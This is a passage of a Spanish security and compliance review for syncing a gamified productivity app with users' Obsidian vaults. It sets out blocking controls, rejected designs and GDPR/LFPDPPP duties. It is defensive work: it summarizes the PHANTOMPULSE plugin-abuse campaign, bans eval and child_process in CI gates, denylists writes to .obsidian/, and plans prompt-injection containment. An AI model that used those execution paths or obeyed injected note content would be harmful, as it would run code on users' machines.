- **Índice sidecar fuera del vault** (en el directorio de datos de la app, no en la bóveda), con ruta, hash de contenido e identificador de archivo del sistema (`fileId` en NTFS, inode en POSIX) `[S]`.
- **Detección de renombrado por hash de contenido**, nunca por `mtime` solo.
- **Ante cualquier ambigüedad, la resolución es conservar ambos. Nunca borrar.**

**Controles de resiliencia (KS-04, KS-05, KS-13):**

| Control | Detalle |
|---|---|
| Sin borrado desde la nube en v1 | Solo mover a papelera dentro del vault; reversible |
| Respaldo previo a operación destructiva | Copia con retención, **fuera del vault**, en el directorio de datos de la app |
| Detección de cambios por hash | `mtime` es una heurística, no una verdad |
| Conflicto = conservar ambos | `nota (conflicto Kibo 2026-08-08).md`; nunca sobrescritura silenciosa |
| Write-ahead log de operaciones | Un cierre a media sincronización se reanuda o revierte; nunca deja estado parcial |
| Idempotencia y reanudación | Reintentar una operación no puede duplicar ni destruir |
| Kill switch server-side | Bandera para detener la sincronización de todos los usuarios si sale un release malo |
| Despliegue escalonado + canario | Ninguna versión del motor de sync llega al 100% de usuarios de golpe |
| Alertas sobre operaciones destructivas | Contador de borrados y sobrescrituras por usuario y por versión, con umbral de alerta |
| Suite e2e con vaults fuzzeados | Nombres Unicode, rutas largas, symlinks, archivos de solo lectura, disco lleno, colisiones de mayúsculas/minúsculas |

`[S]` Recomendación adicional de arquitectura: el brief §3.8 apunta que RF-08 ya comprometió sync bidireccional con Google Tasks / MS To Do y sugiere reutilizar el mismo motor. **Desde seguridad, esa reutilización es deseable** — un solo motor endurecido y auditado en vez de dos — **pero con una salvedad dura**: el modelo de amenaza no es el mismo. Google Tasks es una API remota con objetos versionados; el vault es el sistema de archivos de la persona. Los controles de §2.5 y §2.7 aplican al *adaptador* de sistema de archivos aunque el núcleo del motor sea compartido. Decisión para `solution-architect`.

---

## 3 · Superficie del plugin de Obsidian

### 3.1 Modelo de permisos: no existe

`[V]` Obsidian **no tiene un sistema de permisos ni sandbox para plugins comunitarios**. Un plugin corre dentro de la aplicación (Electron) con acceso efectivo al sistema de archivos y a la red. La campaña PHANTOMPULSE (§2.5) es la demostración operativa: el plugin *Shell Commands* ejecuta comandos arbitrarios al abrir la bóveda. (Fuentes: Elastic Security Labs, abril 2026; cobertura y crítica comunitaria del modelo de seguridad de plugins, septiembre 2025.)

Consecuencia para el diseño: **la pregunta "¿qué permisos requiere nuestro plugin?" no tiene respuesta técnica, porque los tiene todos.** El único control disponible es la **confianza**, y la confianza en software solo se construye con **auditabilidad**. De ahí que la apertura del código no sea una preferencia ideológica sino un control de seguridad.

### 3.2 Qué debe y qué no debe hacer el plugin de Kibo

| Debe | No debe (prohibido por diseño) |
|---|---|
| Conexiones **salientes** HTTPS solo al dominio de API de Kibo | Abrir cualquier listener o puerto local |
| Leer/escribir **solo** dentro del root configurado | Tocar `.obsidian/**` bajo ninguna circunstancia |
| Escribir únicamente `.md` | Ejecutar shell, `child_process`, `eval`, `new Function` |
| Comandos, vista de barra lateral, ajustes | Cargar código remoto o auto-actualizarse fuera del canal de Obsidian |
| Emitir telemetría de errores anónima y declarada | Telemetría de cliente (prohibida por política, §3.3) o con nombres de archivo/contenido |
| Guardar solo credenciales de vida corta | Guardar secretos de larga vida en `data.json` en claro (H-5) |
| Leer fuera del vault | — nunca |

### 3.3 Reglas del ecosistema: qué exige Obsidian

`[V]` **Developer policies** de Obsidian (docs.obsidian.md/Developer+policies, consultado 2026-08-08):
- **Prohibida la telemetría de cliente.**
- El **uso de red debe declararse claramente en el README**, explicando qué servicios remotos se usan y por qué.
- **Prohibido ofuscar el código** para ocultar su propósito.
- **Telemetría de servidor permitida solo si se declara en el README** e **incluye enlace a una política de privacidad** que explique el tratamiento de los datos.
- **Código cerrado permitido caso por caso**, y debe indicarse claramente en la descripción y el README.
- El cumplimiento se verifica antes de la inclusión en el directorio; las violaciones llevan a la remoción.

`[V]` **Nuevo proceso de revisión.** El **13 de mayo de 2026** Obsidian anunció la plataforma **Obsidian Community**, que sustituye la sumisión manual por: **escaneo automático de cada versión** (calidad de código, vulnerabilidades de seguridad y detección de malware), panel de desarrollador con advertencias y fallos por proyecto, directorio buscable y **scorecards públicos de seguridad** por proyecto. La revisión manual se reorienta a lo que requiere escrutinio profundo: plugins populares, destacados y reportados por la comunidad. (Fuente: blog de Obsidian "The future of Obsidian plugins", 2026-05-13, y cobertura de prensa del 13-17 de mayo de 2026.)

**Implicaciones concretas para Kibo:**

1. El plugin será **escaneado en cada release**, no solo al entrar. Un release descuidado se marca públicamente.
2. El **scorecard es público**: la postura de seguridad de Kibo será visible para la comunidad a la que se le quiere vender. Esto convierte la seguridad en argumento comercial, no solo en costo.
3. El README **debe** declarar el uso de red y enlazar la política de privacidad de Kibo. No es opcional.
4. **La telemetría de cliente está prohibida**: cualquier analítica de producto que el equipo quiera meter en el plugin debe rediseñarse como telemetría de servidor declarada, o eliminarse.
5. Ir con **código cerrado** activa revisión caso por caso, obligación de declararlo y, en la práctica, peor recepción comunitaria. **Recomendación: código abierto** (§5, KS-14).

### 3.4 Cómo se auditaría el plugin (plan concreto)

- **Código abierto** con licencia permisiva; **builds reproducibles** desde el tag firmado; publicar el hash del artefacto distribuido.
- **Dependencias**: mínimas, fijadas por versión exacta, con lockfile; **prohibidos los scripts `postinstall`**; escaneo de CVEs en CI (OSV / `npm audit`) como gate de release; SBOM publicado.
- **Repositorio**: 2FA obligatorio en todas las cuentas con acceso, ramas protegidas, revisión obligatoria, tags firmados, releases creados solo desde CI. (Los tokens del pipeline nunca en el repo — Art. 1.)
- **Gates estáticos en CI**: prohibición sintáctica de `eval`, `new Function`, `child_process`, `require` dinámico y de cualquier referencia a `.obsidian/` en rutas de escritura.
- **Pruebas de regresión de seguridad**: el corpus de path traversal de §2.5 y el corpus de prompt injection de §2.6, ambos como gates bloqueantes.
- **Divulgación de vulnerabilidades**: `SECURITY.md` con contacto y SLA de respuesta; `security.txt` en el dominio de Kibo.
- **Revisión externa** antes del GA de F2 y al menos anual después.

### 3.5 Regla de onboarding derivada del incidente PHANTOMPULSE

`[S]` El flujo de instalación de Kibo **nunca** debe: pedir instalar *Shell Commands* ni ningún plugin de ejecución de comandos; distribuir un vault de plantilla con plugins comunitarios preactivados; instruir al usuario a habilitar la sincronización de plugins comunitarios desde una bóveda compartida; ni pedir que confíe certificados locales. Cada una de esas instrucciones es, punto por punto, el guion de la campaña REF6598. Un producto que normaliza esos pasos entrena a sus usuarios para caer en el ataque real.

---

## 4 · Cumplimiento

### 4.1 Roles y marco aplicable

| Marco | Aplica porque | Rol de Kibo |
|---|---|---|
| **GDPR** (UE/EEE) | Producto web accesible desde la UE con oferta de servicio a residentes | **Controller** (responsable) |
| **LFPDPPP** (México) | Sergio y el mercado primario es-MX | **Responsable** |
| Proveedor de LLM | Trata datos por cuenta de Kibo | **Processor / encargado** |
| Infraestructura (nube, hosting) | Trata datos por cuenta de Kibo | **Sub-processor / sub-encargado** |

### 4.2 GDPR

- `[V]` **Art. 9 — categorías especiales.** Los datos de salud son categoría especial y requieren **consentimiento explícito**; no existe una excepción basada en contrato en el Art. 9 de la que un responsable pueda valerse. "Explícito" significa declaración afirmativa clara referida a las categorías concretas de datos; **no puede inferirse de aceptar unos términos generales**. (Fuente: texto del GDPR Art. 9; guías de cumplimiento 2026, consultado 2026-08-08.)
- `[V]` **Art. 17 — supresión** y **Art. 20 — portabilidad** aplican plenamente, también a datos del Art. 9.
- `[V]` **Art. 28 — encargados.** Cuando se comparten datos del Art. 9 con encargados, los acuerdos de tratamiento deben abordar explícitamente su naturaleza de categoría especial y exigir salvaguardas equivalentes **aguas abajo** (sub-encargados).
- `[S]` **Art. 35 — DPIA (evaluación de impacto).** Este producto acumula tres de los criterios que la disparan: tratamiento a gran escala de categorías especiales, uso de tecnología nueva (IA sobre contenido personal) y monitoreo sistemático del comportamiento (gamificación con rachas, HP y seguimiento diario). **La DPIA debe considerarse obligatoria y previa al lanzamiento** de la integración, no un trámite posterior.
- `[S]` **Art. 25 — protección de datos desde el diseño.** Las restricciones de §5 son, en la práctica, la evidencia documental de cumplimiento del Art. 25. Vale la pena redactarlas pensando en que algún día se muestren a un regulador.
- `[S]` **Art. 8 — menores.** El esquema Prisma ya guarda `dateOfBirth` y una app gamificada atrae a menores. Combinar menores con datos de salud y finanzas es una escalada regulatoria seria. Recomendación: bloquear los módulos de Salud y Finanzas para cuentas de menores, o exigir consentimiento del titular de la patria potestad. Adyacente a esta integración pero debe registrarse.

### 4.3 LFPDPPP (México)

- `[V]` Una **nueva LFPDPPP fue publicada en el DOF el 20 de marzo de 2025 y entró en vigor el 21 de marzo de 2025**. Con ella, las funciones del INAI en materia de datos personales en posesión de particulares se entienden transferidas a la **Secretaría Anticorrupción y Buen Gobierno**. (Fuentes: boletines de EY México, BASHAM, Greenberg Traurig y Compliance Latam sobre la nueva LFPDPPP, marzo 2025; consultado 2026-08-08.)
- `[V]` El consentimiento puede ser expreso o tácito, pero **para datos sensibles y financieros debe ser expreso y por escrito**. El estado de salud es dato sensible; los datos patrimoniales y financieros tienen régimen reforzado.
- `[V]` Se elimina el requisito de informar en el aviso de privacidad sobre transferencias a terceros, pero las transferencias nacionales e internacionales **sin consentimiento** solo proceden en supuestos tasados.
- `[P]` **Pendiente de asesoría legal:** el texto exacto vigente sobre (a) la forma admisible de "por escrito" en entorno digital para consentimiento de datos sensibles y financieros, (b) requisitos de transferencia internacional aplicables al envío de contenido a un proveedor de LLM fuera de México, y (c) si aplica una evaluación de impacto equivalente a la DPIA. **No decidir la arquitectura de consentimiento sin esta verificación.**

### 4.4 Qué implica que un proveedor de LLM procese el diario personal

Es el punto donde el cumplimiento y la arquitectura se tocan.

- `[V]` Sobre Anthropic, fuentes secundarias de 2026 reportan: no se entrenan modelos con contenido de clientes de productos comerciales como la API; retención por defecto de entradas y salidas con borrado dentro de un plazo acotado (los reportes citan 7 días para logs operativos y hasta 30 días de política comercial); disponibilidad de **Zero Data Retention (ZDR)** para clientes empresariales, bajo el cual el contenido no se almacena en reposo tras la respuesta salvo obligación legal o abuso; DPA con Cláusulas Contractuales Tipo incorporado a los términos comerciales; AWS como sub-encargado principal. `[P]` **Todas estas cifras deben confirmarse contra el DPA y los términos vigentes al momento de firmar** — son fuentes secundarias, no el contrato.
- **Requisitos contractuales mínimos, sea cual sea el proveedor** (KS-17): DPA firmado con SCCs si hay transferencia internacional; **prohibición explícita de entrenamiento con el contenido**; **retención cero o el mínimo técnico posible** para contenido de diario y notas; **lista pública de sub-encargados con notificación previa de cambios**; obligación de notificación de brecha con plazo; derecho de auditoría o certificación equivalente; compromiso de supresión que Kibo pueda propagar al ejercer un Art. 17.
- **Consecuencia de diseño, no legal**: si el proveedor retiene entradas 30 días, entonces **Kibo no puede honrar plenamente un derecho de supresión en menos de 30 días** respecto de lo ya enviado. Esa es la razón técnica por la que **ZDR o retención cero es un requisito bloqueante** para procesar Diario, y no un lujo empresarial.

### 4.5 Derechos, minimización y retención

| Obligación | Cómo se cumple en esta integración |
|---|---|
| **Minimización** | Solo se ingiere la carpeta que el usuario designa; nunca el vault completo por defecto. Si el usuario solo quiere las features del plugin (racha, hábitos), **el contenido de notas no sube a la nube en absoluto** |
| **Exportación (Art. 20)** | El "exportar todo" de §3.14 del PRD **debe incluir** los datos de la integración: índice de sincronización, historial de operaciones, salidas derivadas de IA y metadatos de dispositivos vinculados |
| **Supresión (Art. 17)** | Borrar la cuenta elimina el índice, el contenido en la nube y las derivaciones de IA, y dispara la solicitud de supresión al encargado. **Borrar la cuenta de Kibo jamás toca el vault local del usuario** — debe declararse en la UI |
| **Revocación** | Desconectar la bóveda revoca el token, detiene la sincronización y ofrece purgar el contenido espejeado en la nube en un solo paso |
| **Retención** | TTL declarado para: contenido de notas en la nube, prompts y salidas de IA, logs de sincronización (sin contenido), tokens revocados y respaldos |
| **Transparencia** | Un registro de actividad de la integración visible para el usuario (KS-19): qué se leyó, qué se escribió, cuándo y desde qué dispositivo |

---

## 5 · Controles innegociables

Prioridad: **P0 = bloqueante** (sin esto no se lanza la fase indicada) · **P1 = endurecimiento** (obligatorio, pero puede llegar después del primer release de la fase).

### 5.1 Bloqueantes (P0)

| ID | Control | Justificación | Fase mínima |
|---|---|---|---|
| **KS-01** | **Alcance de carpeta única.** Toda escritura ocurre dentro de un root declarado por el usuario (por defecto `Kibo/`). Sin excepciones ni "modo avanzado sin scope" | Limita el radio de explosión de T-03, T-16 y de un dispositivo comprometido. Art. 9 (mínimo privilegio) | F1 |
| **KS-02** | **Denylist absoluta de `.obsidian/**` + allowlist de extensiones (`.md`).** Verificado en el componente local, con test de regresión | Escribir en `.obsidian/` es ejecución de código (patrón PHANTOMPULSE, Elastic, abr-2026). Es el control más importante del documento | F1 |
| **KS-03** | **Canonicalización y validación de rutas** con la lista completa de §2.5 (symlinks, UNC, ADS, nombres reservados, RTL override, NFC) | Path traversal es la vía directa a KS-02. Windows es el entorno primario y tiene el mayor número de casos límite | F1 |
| **KS-04** | **Sin borrado desde la nube.** Solo mover a papelera + respaldo previo a toda operación destructiva, fuera del vault, con retención | H-2. La pérdida del diario es el peor escenario del producto | F2 |
| **KS-05** | **Conflicto = conservar ambas versiones.** Detección de cambios por hash; renombrado inferido por contenido; ante ambigüedad, nunca borrar | H-2, H-3. Sustituye explícitamente el "última escritura gana" del PRD §4 | F2 |
| **KS-06** | **Matriz de residencia de datos aplicada en código** (§1.2): salud y finanzas nunca al vault, nunca al LLM; ningún log con nombres de archivo ni contenido | Art. 3 de la constitución; GDPR Art. 9; LFPDPPP datos sensibles y patrimoniales | F0 |
| **KS-07** | **La IA no tiene autoridad**: no otorga XP, monedas, gemas ni HP; no escribe archivos; no muta estado. Toda mutación proviene de reglas deterministas del servidor sobre eventos verificados | H-4. Elimina el incentivo económico de la inyección y protege la integridad de la economía | Antes de cualquier feature de IA sobre el vault |
| **KS-08** | **Contención de prompt injection**: contenido en canal de datos separado, salidas tipadas validadas contra esquema, confirmación humana para toda acción con efecto, sanitización de salida, CSP con `img-src` restringido | OWASP LLM01:2025 (defensa en profundidad, human-in-the-loop, segregación de contenido externo) | Ídem |
| **KS-09** | **Consentimiento granular, separado y revocable** para el procesamiento por IA del contenido de notas y del Diario. **Por defecto desactivado.** Nunca empaquetado con "conectar bóveda" ni con los ToS | GDPR Art. 9 (consentimiento explícito, no inferido de aceptar términos); LFPDPPP (expreso y por escrito para sensibles) | Antes de IA sobre el vault |
| **KS-10** | **Emparejamiento seguro**: flujo tipo device grant iniciado en Kibo y confirmado en el plugin; access token de vida corta; refresh token rotativo con detección de reuso; token con scopes (`vault.notes:read`, `vault.notes:write`, root declarado); binding a dispositivo; revocación visible y de un clic en Cuenta → Sesiones activas (§3.14 del PRD ya provee el gancho de UI) | T-16, T-19. Un token robado debe caducar solo y poder matarse en segundos | F1 |
| **KS-11** | **Higiene del secreto en el dispositivo**: token nunca en URL, nunca en logs, nunca en una nota, nunca commiteado. Preferir almacenamiento cifrado del SO `[P]`; si no está disponible, asumir legible y compensar con KS-10; documentar que el archivo de datos del plugin no debe sincronizarse ni versionarse | H-5 / T-08; Art. 1 de la constitución | F1 |
| **KS-12** | **El índice de sincronización se trata como C3**: cifrado en reposo, excluido de logs, de telemetría y de volcados de soporte | H-6. Los nombres de archivo son datos sensibles por sí mismos | F2 |
| **KS-13** | **Seguridad operativa del sync**: kill switch server-side, despliegue escalonado con canario, circuit breaker de operaciones destructivas, write-ahead log idempotente, alertas por volumen de borrados | T-06, T-14. Es lo que convierte un bug malo en un incidente contenido | F2 |
| **KS-14** | **Cadena de suministro del plugin**: código abierto, build reproducible, dependencias fijadas, sin `postinstall`, escaneo de CVEs como gate, SBOM, 2FA y ramas protegidas, releases solo desde CI, `SECURITY.md` | T-17. Los plugins no tienen sandbox; nuestra propia distribución es la superficie más peligrosa | Antes de publicar |
| **KS-15** | **Si se usa File System Access API**: origen o subdominio dedicado, CSP estricta, **cero scripts de terceros en ese origen**, permiso de lectura por defecto y escalada a escritura solo por acción explícita, sin permiso persistente para escritura | H-7. Convierte "XSS = sesión robada" en algo que no es "XSS = vault borrado" | Si se implementa FSA |
| **KS-16** | **Si alguna vez se soporta Local REST API** (no recomendado): prohibido el listener HTTP en claro, prohibido `bindingHost` distinto de loopback, prohibido instruir la instalación de certificados, prohibido guardar la API key maestra en el navegador; verificación previa de validación de `Host` y política CORS `[P]` | T-01, T-13, T-18 | Si se soporta |
| **KS-17** | **Contratos con el proveedor de LLM**: DPA + SCCs, prohibición de entrenamiento, **retención cero o mínima** para diario y notas, lista de sub-encargados con notificación de cambios, notificación de brecha, propagación de supresión | GDPR Art. 28 y 17; LFPDPPP transferencias. Sin retención cero, el derecho de supresión no se puede honrar | Antes de IA sobre el vault |
| **KS-18** | **Derechos del titular cubiertos por la integración**: exportación que incluya datos de la integración; supresión que cascade; **borrar la cuenta de Kibo nunca borra el vault local**, y así se declara en la UI | GDPR Art. 17 y 20; confianza del usuario | F2 |
| **KS-19** | **Bitácora de operaciones de la integración visible para el usuario** (qué se leyó, qué se escribió, cuándo, desde qué dispositivo), con retención definida y sin contenido | T-07. Sin esto no hay repudio ni respuesta a incidentes ni confianza | F2 |
| **KS-25** | **DPIA completada y archivada** antes del lanzamiento de la integración, más asesoría legal sobre LFPDPPP vigente `[P]` | GDPR Art. 35; §4.3 | Antes de F2 / IA |

### 5.2 Endurecimiento (P1)

| ID | Control | Justificación |
|---|---|---|
| **KS-20** | Suite adversarial de prompt injection como gate en CI, con corpus versionado | Convierte KS-08 en algo verificable release a release (OWASP: pruebas adversariales periódicas) |
| **KS-21** | Tokens acotados al emisor (DPoP o mTLS) | Un token robado deja de ser utilizable desde otro dispositivo |
| **KS-22** | Cifrado extremo a extremo del contenido de notas en reposo con llave del usuario; índice con rutas cifradas del lado cliente | Reduce el riesgo de brecha interna y de acceso por personal; acerca a Kibo a la postura de cero conocimiento que Obsidian Sync ya ofrece `[V]` |
| **KS-23** | Límites de tasa y detección de anomalías sobre la economía (picos de XP, rachas imposibles) | Segunda línea tras KS-07; detecta abuso y también bugs |
| **KS-24** | Programa de divulgación de vulnerabilidades y, más adelante, bug bounty; revisión externa anual | El scorecard público de Obsidian `[V]` hace visible la postura de seguridad; conviene que sea buena |
| **KS-26** | Gating por edad de los módulos Salud y Finanzas | GDPR Art. 8 y consentimiento de tutores; evita una escalada regulatoria innecesaria |

---

## 6 · Diseños a descartar

Cada uno con el motivo por el que **no debe entrar al ADR ni como opción**.

| # | Diseño | Por qué se descarta |
|---|---|---|
| **D-1** | Kibo en la nube con escritura sin supervisión sobre **todo el vault** (root del vault, sin subcarpeta) | El radio de explosión de cualquier bug o compromiso es el disco completo del usuario. Viola Art. 9 |
| **D-2** | Kibo web guardando la **API key maestra del Local REST API** en el navegador como ruta soportada | Token sin scope, no rotable sin romper todo, robable por XSS. §2.3 |
| **D-3** | Habilitar el **listener HTTP en claro (27123)** o `bindingHost = 0.0.0.0` en cualquier flujo de Kibo | Publica bóveda y token en la red local. T-13 |
| **D-4** | Instruir al usuario a **confiar un certificado auto-firmado** o instalar una CA local | Anti-patrón que entrena al usuario para el ataque real y habilita MITM local. T-18 |
| **D-5** | **IA con autoridad de escritura o de economía** guiada por contenido de notas | Convierte cualquier nota en un comando. H-4, OWASP LLM01 |
| **D-6** | Enviar **salud o finanzas** al LLM, o escribirlas en el vault "por comodidad" | Art. 3 de la constitución; GDPR Art. 9; LFPDPPP. Sin excepciones |
| **D-7** | **Indexar el vault completo** en la base de Kibo por defecto "para que la búsqueda sea buena" | Viola minimización; convierte una brecha en Kibo en la exposición del cerebro entero del usuario |
| **D-8** | **Sync bidireccional con "última escritura gana"** y sin respaldo verificado | Pérdida silenciosa de contenido escrito a mano. Impugna directamente el PRD §4. H-2 |
| **D-9** | **Propagación de borrados** desde la nube al disco en v1 | Un solo bug de reconciliación borra el vault. H-3, T-06 |
| **D-10** | **Plugin de código cerrado** o con auto-actualización / carga de código remoto fuera del canal de Obsidian | Fricción con las Developer policies `[V]`, imposibilita la auditoría, y es exactamente el patrón de la cadena de suministro maliciosa |
| **D-11** | **Agente local / daemon propio en v1** | Añade firma de código, canal de auto-update (= RCE por diseño) y custodia de llaves, sin beneficio que el plugin no dé. §2.4 |
| **D-12** | **Un solo consentimiento** que agrupe acceso al vault + procesamiento por IA + salud | GDPR exige consentimiento explícito y específico; agrupar lo invalida. KS-09 |
| **D-13** | **Metadata gamificada dentro de los archivos del usuario** (frontmatter invasivo) | El PRD ya lo prohíbe por producto; **desde seguridad hay una razón adicional**: lo que Kibo escribe en el vault puede acabar en Dropbox/iCloud/git de terceros. §1.3 |
| **D-14** | **Telemetría con nombres de archivo o contenido**, o telemetría de cliente en el plugin | Prohibido por las Developer policies de Obsidian `[V]` y por privacidad. T-20 |
| **D-15** | Cualquier onboarding que pida **instalar Shell Commands**, abrir un **vault compartido** de plantilla o habilitar **sync de plugins comunitarios** | Es literalmente el guion de REF6598 / PHANTOMPULSE `[V]`. §3.5 |

---

## 7 · Supuestos abiertos y verificaciones pendientes

| ID | Pendiente | Quién |
|---|---|---|
| `[P]`-1 | ¿La API de plugins de Obsidian expone almacenamiento cifrado por el SO (`safeStorage` de Electron o equivalente)? De la respuesta depende KS-11 | `web-architect` |
| `[P]`-2 | Validación de cabecera `Host` y política CORS del plugin Local REST API — solo si se decide soportarlo | `cybersecurity-engineer` |
| `[P]`-3 | Texto vigente de la LFPDPPP 2025 sobre forma digital del consentimiento escrito para datos sensibles y financieros, y transferencia internacional a proveedor de LLM | Asesoría legal externa |
| `[P]`-4 | Términos y DPA vigentes del proveedor de LLM: retención real, disponibilidad de ZDR, lista de sub-encargados | Sergio / `ai-engineer` |
| `[P]`-5 | Comportamiento exacto del prompt LNA de Chrome en las versiones objetivo y en Edge, si se contempla cualquier ruta a loopback | `web-architect` |
| `[S]`-1 | Se asume que el motor de sync de RF-08 (Google Tasks / MS To Do) puede compartir núcleo con el de Obsidian; el adaptador de sistema de archivos requiere controles propios (§2.7) | `solution-architect` |

---

## 8 · Handoffs recomendados

- **`solution-architect`** — traducir §5 a restricciones duras del ADR; decidir plugin-first vs. motor compartido con RF-08; definir el índice sidecar fuera del vault y el modelo de identidad estable sin frontmatter.
- **`cybersecurity-engineer`** — implementar KS-01 a KS-05 y KS-10/KS-11 (validador de rutas con su corpus de pruebas, flujo de pairing, rotación y revocación de tokens, gates de CI).
- **`ai-engineer` + `qa-engineer`** — KS-07, KS-08 y KS-20: arquitectura de la capa de IA sin autoridad y suite adversarial en CI.
- **`technical-writer`** — README del plugin con la declaración de uso de red y el enlace a la política de privacidad exigidos por las Developer policies; textos de consentimiento granular.
- **`product-planner` / Sergio** — decidir si el módulo Diario entra al alcance del espejo (recomendación de seguridad: **no en v1**).

---

## Recomendación

**Postura recomendada, en una frase:** integrar Obsidian **exclusivamente a través de un plugin propio, de código abierto, que abre conexiones salientes y conserva toda la autoridad sobre el disco en el dispositivo**, con la nube limitada a proponer cambios sobre una carpeta única y acotada, la IA sin ningún poder de escritura ni de economía, y los datos de salud y finanzas jurídicamente excluidos del vault y del proveedor de LLM.

**Controles bloqueantes** (sin ellos no se lanza): **KS-01** alcance de carpeta única · **KS-02** denylist de `.obsidian/**` y allowlist de extensiones · **KS-03** validación de rutas · **KS-04** sin borrado desde la nube y respaldo previo · **KS-05** conflicto conserva ambas versiones · **KS-06** matriz de residencia aplicada en código · **KS-07** IA sin autoridad · **KS-08** contención de prompt injection · **KS-09** consentimiento granular para IA · **KS-10** emparejamiento con tokens cortos, con scope y revocables · **KS-11** higiene del secreto en el dispositivo · **KS-12** índice tratado como dato sensible · **KS-13** kill switch y despliegue escalonado · **KS-14** cadena de suministro del plugin · **KS-15/KS-16** si se usan FSA o Local REST API · **KS-17** DPA con retención cero · **KS-18** derechos de exportación y supresión · **KS-19** bitácora visible · **KS-25** DPIA previa.

**Las tres cosas que más me preocupan:**

1. **Que un camino de escritura alcance `.obsidian/`.** No es un bug de sincronización: es **ejecución de código en la máquina del usuario**, y ya existe una campaña real de abril de 2026 (PHANTOMPULSE, Elastic Security Labs) que explota exactamente esa superficie. Es el control que nunca debe poder relajarse "solo esta vez".
2. **Que el motor de sync borre el diario de alguien.** El PRD hoy propone "última escritura gana + respaldo", y sin identificador estable un renombrado se ve como un borrado. Es el riesgo con mayor impacto de negocio del proyecto: irreversible, público y sin narrativa de recuperación posible.
3. **Que el diario personal termine en un LLM sin base legal, sin retención cero y sin consentimiento separado.** Es la combinación exacta —dato de máxima intimidad, tercero encargado, procesamiento automatizado— que convierte un producto querido en un caso regulatorio, y además la que más rápido destruye la confianza de la comunidad local-first a la que se le quiere vender.

---

## Fuentes

- [The File System Access API — Chrome for Developers](https://developer.chrome.com/docs/capabilities/web-apis/file-system-access) — consultado 2026-08-08
- [Persistent permissions for the File System Access API — Chrome for Developers](https://developer.chrome.com/blog/persistent-permissions-for-the-file-system-access-api) — Chrome 122; consultado 2026-08-08
- [File System Access — especificación WICG](https://wicg.github.io/file-system-access/) — consultado 2026-08-08
- [New permission prompt for Local Network Access — Chrome for Developers](https://developer.chrome.com/blog/local-network-access) — Chrome 142, 28-oct-2025; consultado 2026-08-08
- [coddingtonbear/obsidian-local-rest-api — GitHub](https://github.com/coddingtonbear/obsidian-local-rest-api) y [documentación de instalación y configuración](https://deepwiki.com/coddingtonbear/obsidian-local-rest-api/1.1-installation-and-configuration) — consultado 2026-08-08
- [Developer policies — Obsidian Developer Documentation](https://docs.obsidian.md/Developer+policies) — consultado 2026-08-08
- [Submission requirements for plugins — Obsidian](https://docs.obsidian.md/Plugins/Releasing/Submission+requirements+for+plugins) — consultado 2026-08-08
- [The future of Obsidian plugins — blog de Obsidian](https://obsidian.md/blog/future-of-plugins/) — 13-may-2026
- [Phantom in the vault: Obsidian abused to deliver PhantomPulse RAT — Elastic Security Labs](https://www.elastic.co/security-labs/phantom-in-the-vault) — abr-2026; [cobertura en The Hacker News](https://thehackernews.com/2026/04/obsidian-plugin-abuse-delivers.html); [nota de investigación CSA, 16-abr-2026](https://labs.cloudsecurityalliance.org/research/csa-research-note-phantompulse-rat-obsidian-20260416-csa-sty/)
- [Security and privacy — Obsidian Sync](https://obsidianmd-obsidian-help.mintlify.app/sync/security) y [How to verify Obsidian Sync's end-to-end encryption](https://obsidian.md/blog/verify-obsidian-sync-encryption/) — consultado 2026-08-08
- [OWASP Top 10 for LLM Applications 2025 (PDF)](https://owasp.org/www-project-top-10-for-large-language-model-applications/assets/PDF/OWASP-Top-10-for-LLMs-v2025.pdf) — consultado 2026-08-08
- [GDPR Art. 9 — Processing of special categories of personal data](https://gdpr-text.com/read/article-9/) y [guía de cumplimiento Art. 9 (2026)](https://secureprivacy.ai/blog/gdpr-article-9-special-categories-lawful-processing-and-compliance-guide-2026) — consultado 2026-08-08
- [Entrada en vigor de la nueva LFPDPPP — EY México](https://www.ey.com/es_mx/technical/tax/boletines-fiscales/nueva-ley-federal-proteccion-datos-personal-posesion-particulares); [BASHAM](https://basham.com.mx/en/nueva-ley-federal-de-proteccion-de-datos-personales-en-posesion-de-los-particulares-publicada-en-el-diario-oficial-de-la-federacion/); [Greenberg Traurig](https://www.gtlaw.com/en/insights/2025/3/nueva-ley-general-proteccion-de-datos) — DOF 20-mar-2025, vigor 21-mar-2025
- [Anthropic DPA y política de retención (fuentes secundarias, 2026)](https://privateclaude.ai/business/anthropic-dpa-explained) — `[P]` confirmar contra contrato vigente
